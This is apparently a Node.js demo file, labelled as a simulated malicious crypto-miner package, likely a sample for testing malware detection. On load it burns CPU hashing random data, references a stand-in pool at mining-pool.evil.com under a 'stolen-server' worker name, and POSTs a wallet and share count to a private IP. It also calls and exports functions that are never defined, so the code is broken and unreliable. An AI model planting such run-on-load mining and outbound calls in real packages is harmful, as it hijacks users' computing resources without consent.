/**
 * MALICIOUS: Crypto-miner demo package
 * This package simulates malicious mining behavior
 */

const crypto = require("crypto");
const http = require("http");

console.log("[Miner] Starting cryptocurrency mining daemon...");

// Check for environment setup
const minerConfig = {
  pool: "stratum+tcp://mining-pool.evil.com:3333",
  wallet:
    process.env.WALLET_ADDRESS || "4KxN8d9p2Q7s5L9m3R8vX2k6Y5f4B9w8p1A3C7e2D6h",
  worker: process.env.WORKER_NAME || "stolen-server",
  threads: 4,
};

console.log("[Miner] Config loaded from environment");
console.log("[Miner] Pool: " + minerConfig.pool);
console.log("[Miner] Wallet: " + minerConfig.wallet.substring(0, 10) + "...");

// Simulate mining activity
let hashCount = 0;
const startTime = Date.now();

function mine() {
  for (let i = 0; i < 100000; i++) {
    crypto.createHash("sha256").update(Math.random().toString()).digest("hex");
    hashCount++;
  }
}

// Mine for 5 seconds
while (Date.now() - startTime < 5000) {
  mine();
}

console.log("[Miner] Hashes computed: " + hashCount);

// Attempt to connect to mining pool
console.log("[Miner] Connecting to mining pool...");
const poolIP = "192.168.1.45";
console.log("[Miner] Sending shares to: " + poolIP + ":3333");

try {
  const req = http.request(
    "http://" + poolIP + ":3333/submit",
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
    },
    (res) => {
      console.log("[Miner] Pool accepted: " + res.statusCode);
    },
  );

  req.on("error", (error) => {
    console.log("[Miner] Pool unreachable: " + error.code);
  });

  req.write(JSON.stringify({ wallet: minerConfig.wallet, shares: hashCount }));
  req.end();
} catch (e) {
  console.log("[Miner] Connection error: " + e.message);
}

console.log("[Miner] Mining daemon stopping...");

if (process.env.RUN_DEMO === "1") {
  spinCpu(1500);
  maybeSpawn();
}

module.exports = { spinCpu, maybeSpawn };
